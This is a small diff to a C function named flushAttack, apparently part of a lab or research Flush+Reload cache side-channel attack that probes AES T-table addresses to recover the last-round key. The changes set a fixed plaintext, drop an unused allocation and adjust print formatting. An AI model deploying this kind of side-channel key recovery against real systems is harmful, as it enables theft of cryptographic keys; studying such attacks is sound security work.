@@ -101,7 +101,7 @@ void flushAttack(int sockfd)
     end = base + size;
 
     int i, j, k;
-    unsigned int plaintext[16];
+    unsigned int plaintext[16] = {0x54, 0x77, 0x6F, 0x20, 0x4F, 0x6E, 0x65, 0x20, 0x4E, 0x69, 0x6E, 0x65, 0x20, 0x54, 0x77, 0x6F};
     unsigned int ciphertext[16];
     unsigned int restoredtext[128];
     unsigned int countKeyCandidates[16][256];
@@ -109,8 +109,6 @@ void flushAttack(int sockfd)
     unsigned int totalEncs[16][256];
     double missRate[16][256];
     unsigned int lastRoundKeyGuess[16];
-    unsigned int **taddress;
-    taddress = (unsigned int **)malloc(sizeof(unsigned int *) * 4);
 
     //receiving t-table addresses from the server
     //read(sockfd, taddress, sizeof(unsigned int *) * 4);
@@ -128,7 +126,9 @@ void flushAttack(int sockfd)
     srand(min_time);
     sum = 0;
     char *probe[] = {base + 0x40c0, base + 0x44c0, base + 0x48c0, base + 0x4cc0};
+
     printf("\nT-table addresses...\nTe0: %p\nTe1: %p\nTe2: %p\nTe3: %p\n", probe[0], probe[1], probe[2], probe[3]);
+
     for (k = 0; k < 4; k++)
     {
         for (i = 0; i < NUMBER_OF_ENCRYPTIONS; ++i)
@@ -264,7 +264,7 @@ void flushAttack(int sockfd)
     printf("\nKey found from attack: ");
     for (i = 3; i >= 0; i--)
     {
-        printf("%x  ", roundWords[i]);
+        printf("%X  ", roundWords[i]);
     }
     printf("\n");
 
